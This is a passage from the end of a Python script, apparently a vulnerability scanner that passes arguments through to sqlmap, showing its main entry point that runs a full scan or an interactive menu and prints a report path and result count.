            sqlmap_args=args.sqlmap_args,
        )
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
        sys.exit(1)

    if args.run_full:
        scanner.run_full_scan()
        path = scanner.generate_report()
        if scanner.vulnerabilities:
            print(f"{Fore.RED}[RESULT] Vulnerabilities found: {len(scanner.vulnerabilities)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[RESULT] No vulnerabilities found.{Style.RESET_ALL}")
        print(f"[REPORT] {path}")
    else:
        scanner.interactive_menu()


if __name__ == "__main__":
    main()

